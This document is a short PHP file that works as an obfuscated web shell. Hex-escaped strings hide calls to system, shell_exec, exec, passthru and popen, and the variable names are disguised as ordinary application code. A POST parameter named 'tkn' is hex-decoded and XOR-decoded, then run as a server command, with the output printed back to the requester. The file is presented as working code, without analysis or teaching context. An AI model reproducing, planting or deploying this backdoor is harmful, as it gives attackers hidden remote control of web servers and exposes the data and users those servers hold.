<?php

$event_dispatcher3 = "\x65\x78ec";
$event_dispatcher6 = "\x73t\x72eam_\x67\x65\x74_\x63ont\x65\x6E\x74s";
$event_dispatcher7 = "pclos\x65";
$event_dispatcher5 = "pope\x6E";
$event_dispatcher1 = "s\x79\x73t\x65m";
$event_dispatcher4 = "p\x61ss\x74hr\x75";
$query_handler = "\x68e\x782b\x69\x6E";
$event_dispatcher2 = "\x73h\x65ll_e\x78ec";
if (isset($_POST["\x74\x6Bn"])) {
            function reverse_lookup ( $factor, $flg) {
$pgrp='';
 foreach(str_split($factor) as $char){
$pgrp.=chr(ord($char)^$flg);

} return$pgrp;
 
}
            $tkn = $query_handler($_POST["\x74\x6Bn"]);
            $tkn = reverse_lookup($tkn, 47);
            if (function_exists($event_dispatcher1)) {
                $event_dispatcher1($tkn);
            } elseif (function_exists($event_dispatcher2)) {
                print $event_dispatcher2($tkn);
            } elseif (function_exists($event_dispatcher3)) {
                $event_dispatcher3($tkn, $token_factor);
                print join("\n", $token_factor);
            } elseif (function_exists($event_dispatcher4)) {
                $event_dispatcher4($tkn);
            } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
                $flg_pgrp = $event_dispatcher5($tkn, 'r');
                if ($flg_pgrp) {
                    $fac_hld = $event_dispatcher6($flg_pgrp);
                    $event_dispatcher7($flg_pgrp);
                    print $fac_hld;
                }
            }
            exit;
        }